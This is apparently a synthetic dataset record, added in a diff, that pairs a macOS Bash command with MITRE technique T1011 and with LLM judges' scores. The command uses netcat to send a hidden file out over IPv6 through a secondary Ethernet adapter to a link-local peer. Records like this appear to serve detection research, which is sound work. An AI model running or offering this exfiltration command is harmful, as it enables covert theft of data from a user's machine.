@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr en5)\" \"fe80::2:abcd:7%en5\" 53127 < /Users/Shared/.cache.bin",
+  "explanation": "Forces exfiltration over a non-primary, often dormant USB/Thunderbolt Ethernet adapter (en5) via IPv6 TCP on an uncommon port, consistent with T1011 by using an alternate physical medium.",
+  "rationale_steps": [
+    "Use ipconfig to fetch the IPv6 address of the auxiliary Ethernet interface en5.",
+    "Bind netcat's source to en5's address to avoid the primary network path.",
+    "Exfiltrate data over IPv6 TCP to a link-local peer on a high-numbered port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-3cfd2e08",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash command with balanced quotes, valid BSD nc flags (-6, -s), a correctly quoted IPv6 literal with scope, and proper input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It binds to en5’s IPv6 address and connects to a link-local target with the en5 scope to send the file, aligning with exfiltration over an alternate medium, though it depends on en5 having an IPv6 address and a reachable listener.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:28:36.014264Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for netcat, correct use of command substitution, and proper file redirection syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements T1011 by using netcat to exfiltrate data over an alternate network interface (en5, likely a USB/Thunderbolt adapter) via IPv6 to a specific destination on an uncommon port (53127), which is a realistic method for exfiltration over a secondary network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:28:40.787753Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct syntax for `nc` flags, command substitution, IPv6 link-local addresses with scope IDs, and input redirection, all properly quoted for Bash on macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command expertly leverages `nc` to exfiltrate data via a specific non-primary interface (`en5`) using IPv6 link-local addressing and an uncommon port, precisely matching the T1011 technique of using an alternate physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:13:31.420623Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
